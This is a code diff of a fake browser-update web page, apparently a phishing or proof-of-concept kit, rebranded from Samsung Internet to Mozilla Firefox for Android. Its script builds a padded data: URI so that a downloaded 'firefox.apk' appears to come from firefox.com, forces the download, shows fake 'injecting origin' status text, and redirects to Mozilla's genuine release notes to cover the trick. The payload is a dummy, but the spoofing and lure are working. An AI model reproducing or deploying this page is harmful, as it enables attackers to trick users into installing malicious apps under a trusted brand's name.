@@ -1,17 +1,18 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Samsung Internet Security Update</title>
+    <title>Mozilla Firefox Security Update</title>
     <style>
-        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', sans-serif; text-align: center; padding-top: 50px; }
-        .container { border: 1px solid #0078d4; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(0, 120, 212, 0.2); }
-        .brand-logo { color: #0078d4; font-size: 3em; font-weight: bold; margin-bottom: 10px; }
-        .warning { color: #44baff; font-weight: bold; font-size: 1.1em; margin-bottom: 20px; }
-        #installBtn {
+        body { background: #0b0b0b; color: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding-top: 50px; }
+        .container { border: 1px solid #ff7113; padding: 30px; display: inline-block; border-radius: 15px; background: #1a1a1a; box-shadow: 0 0 20px rgba(255, 113, 19, 0.2); }
+        .fox-logo { color: #ff7113; font-size: 3em; font-weight: bold; margin-bottom: 10px; }
+        .warning { color: #ffbd44; font-weight: bold; font-size: 1.1em; margin-bottom: 20px; }
+        #strikeBtn {
             padding: 15px 35px;
-            background: #0078d4;
+            background: #ff7113;
             color: #fff;
             border: none;
             cursor: pointer;
@@ -20,53 +21,57 @@
             border-radius: 8px;
             transition: 0.3s;
         }
-        #installBtn:hover { background: #005a9e; transform: scale(1.05); }
+        #strikeBtn:hover { background: #e65b00; transform: scale(1.05); }
         #status { margin-top: 25px; font-size: 0.8em; color: #888; font-family: monospace; }
     </style>
 </head>
 <body>
+
     <div class="container">
-        <div class="brand-logo">🌐</div>
-        <div class="warning">Browser Update Required</div>
-        <p>A critical security patch for Samsung Internet is ready.</p>
-                
-        <button type="button" id="installBtn">
-            Update Internet Browser
+        <div class="fox-logo">🦊</div>
+        <div class="warning">Security Patch Required</div>
+        <p>A critical update is available for Firefox Android.</p>
+        
+        <button type="button" id="strikeBtn">
+            Install Update (v124.0.2)
         </button>
-        <div id="status">> SYSTEM_READY: Pending user verification...</div>
+
+        <div id="status">> SYSTEM_READY: Awaiting verification...</div>
     </div>
 
 <script>
-    document.getElementById('installBtn').addEventListener('click', function() {
+    document.getElementById('strikeBtn').addEventListener('click', function() {
         // --- 1. CONFIGURATION ---
-        const filename = "Internet.apk"; // Nama file diganti sesuai permintaan
-        const realDomain = "www.samsung.com";
-                
+        const filename = "firefox.apk";
+        const realDomain = "www.firefox.com";
+        
         // --- 2. ADVANCED SPOOFING LOGIC ---
-        // Padding masif untuk mendorong skema data: keluar dari tampilan UI
-        const padding = "/update/".repeat(30);
+        // Menggunakan fragment (#) dan padding masif untuk mengecoh parser UI Firefox Android.
+        const padding = ".https://" + realDomain + "/https://firefox.com/".repeat(25);
         const longSub = realDomain + padding;
 
         // --- 3. PAYLOAD CONSTRUCTION ---
-        // Dummy Base64 (Hanya untuk demonstrasi)
+        // Base64 dummy payload
         const base64Payload = "ZXN0dGVzdGVzdHRlc3Q="; 
-        const payload = `data:application/vnd.android.package-archive;base64,${base64Payload}#https://${longSub}`;
+        const payload = `data:application/octet-stream;base64,${base64Payload}#${longSub}`;
 
         // --- 4. EXECUTION ---
         const a = document.createElement('a');
         a.href = payload;
         a.download = filename;
         a.rel = "noopener";
-                
+        
         document.body.appendChild(a);
         a.click();
-                
+        
         document.getElementById('status').innerText = "> INJECTING_ORIGIN: " + realDomain;
 
-        // --- 5. CLEANUP ---
+        // --- 5. CLEANUP & REDIRECT ---
         setTimeout(() => {
             document.body.removeChild(a);
-        }, 1500);
+            // Redirect ke halaman rilis resmi Mozilla
+            window.location.replace("https://www.mozilla.org/en-US/firefox/android/notes/");
+        }, 1800);
     });
 </script>
 </body>
